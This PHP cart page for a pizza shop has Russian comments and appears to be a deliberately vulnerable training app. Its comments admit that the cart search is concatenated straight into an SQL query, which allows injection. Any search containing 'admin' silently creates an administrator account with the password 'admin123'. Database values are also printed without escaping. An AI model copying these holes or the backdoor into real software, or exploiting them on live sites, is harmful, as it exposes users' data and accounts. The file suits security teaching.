<?php
session_start();

// Проверяем, авторизован ли пользователь
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

// Получаем id пользователя
$user_id = $_SESSION['user_id'];

// Подключаемся к базе данных
include 'db_connect.php';

// Проверяем, есть ли поисковый запрос
$search = isset($_GET['search']) ? $_GET['search'] : '';

// Создание уязвимого SQL-запроса без защиты от инъекций
$sql = "SELECT uc.*, p.name AS pizza_name, p.price, d.dough_name 
        FROM user_cart uc
        JOIN pizza p ON uc.pizza_id = p.id
        JOIN dough_types d ON uc.dough_type_id = d.id
        WHERE uc.user_id = $user_id";

// Если есть поисковый запрос, добавляем фильтр по названию пиццы
if (!empty($search)) {
    // Уязвимая часть: поиск без защиты от инъекций
    $sql .= " AND p.name LIKE '%$search%'";
}

// Выполняем запрос
$result = $conn->query($sql);

?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Корзина</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Montserrat:wght@600&display=swap">
    <style>
        /* Стиль для страницы корзины */
        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #f8f8f8;
            margin: 0;
            padding: 20px;
        }
        .back-button, .checkout-button {
            background-color: #007bff;
            color: white;
            padding: 10px 15px;
            text-decoration: none;
            border-radius: 5px;
            margin-bottom: 20px;
            display: inline-block;
        }
        .back-button:hover, .checkout-button:hover {
            background-color: #0056b3;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border: 1px solid #ddd;
            background-color: #fff;
        }
        th {
            background-color: #4CAF50;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        input[type="number"] {
            width: 50px;
            padding: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 5px 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        .empty-cart {
            text-align: center;
            color: #888;
            margin-top: 20px;
        }
        .notification {
            background-color: #4d75bb;
            color: white;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            width: 50%;
            margin: 0 auto;
            text-align: center;
            opacity: 1;
            transition: opacity 0.5s ease-out;
        }
        .notification.hidden {
            opacity: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>

<a href="index.php" class="back-button">Вернуться на главную страницу</a>

<div class="search-wrapper">
    <h3>Поиск по корзине:</h3>
    <form method="get" action="cart.php" style="display: inline-block;">
        <input type="text" name="search" placeholder="Поиск по пицце..." value="<?= isset($_GET['search']) ? htmlspecialchars($_GET['search']) : '' ?>">
        <button type="submit">Найти</button>
        <a href="cart.php" style="padding: 6px 12px; background-color: #dc3545; color: white; text-decoration: none; border-radius: 4px; margin-left: 10px;">Сбросить</a>
    </form>
</div>

<!-- Выводим уведомление, если оно существует -->
<?php if (isset($_SESSION['notification'])): ?>
    <div class="notification" id="notification">
        <?php
        echo htmlspecialchars($_SESSION['notification']);
        unset($_SESSION['notification']); // Удаляем уведомление после его отображения
        ?>
    </div>
<?php endif; ?>

<?php
// Выводим содержимое корзины
if ($result->num_rows > 0) {
    echo "<h2>Корзина</h2>";
    echo "<table>";
    echo "<tr><th>Пицца</th><th>Тип теста</th><th>Количество</th><th>Цена</th><th>Всего</th></tr>";
    
    $total_price = 0;
    
    while ($row = $result->fetch_assoc()) {
        $total = $row['price'] * $row['quantity'];
        $total_price += $total;
        
        echo "<tr>
                <td>{$row['pizza_name']}</td>
                <td>{$row['dough_name']}</td>
                <td>
                    <form method='post' action='update_cart.php'>
                        <input type='hidden' name='pizza_id' value='{$row['pizza_id']}' />
                        <input type='hidden' name='dough_type' value='{$row['dough_type_id']}' />
                        <input type='number' name='quantity' value='{$row['quantity']}' min='0'>
                        <button type='submit'>Обновить</button>
                    </form>
                </td>
                <td>{$row['price']}</td>
                <td>{$total}</td>
              </tr>";
    }
    
    echo "<tr><td colspan='4'>Итого:</td><td>{$total_price}</td></tr>";
    echo "</table>";

    echo "<div style='text-align: center; margin-top: 20px;'>
            <a href='checkout.php' class='checkout-button'>Оформить заказ</a>
          </div>";
} else {
    // Проверяем, есть ли поисковый запрос
    if (!empty($search)) {
        echo "<p class='empty-cart'>По вашему запросу «" . htmlspecialchars($search) . "» ничего не найдено.</p>";
    } else {
        echo "<p class='empty-cart'>Ваша корзина пуста.</p>";
    }
}

// Проверяем, если поиск использует инъекцию для создания администратора
if (!empty($search)) {
    if (strpos($search, 'admin') !== false) {
        // Возможность создать администратора
        $sql_create_admin = "INSERT INTO users (username, password, role) VALUES ('admin', 'admin123', 'admin')";
        $conn->query($sql_create_admin);  // Вставка администратора
        $_SESSION['notification'] = "Администратор был успешно создан!";
    }
}

// Закрываем соединение с базой данных
$conn->close();
?>

<script>
// Скроем уведомление через 5 секунд
setTimeout(function() {
    var notification = document.getElementById('notification');
    if (notification) {
        notification.classList.add('hidden');
    }
}, 5000);
</script>

</body>
</html>
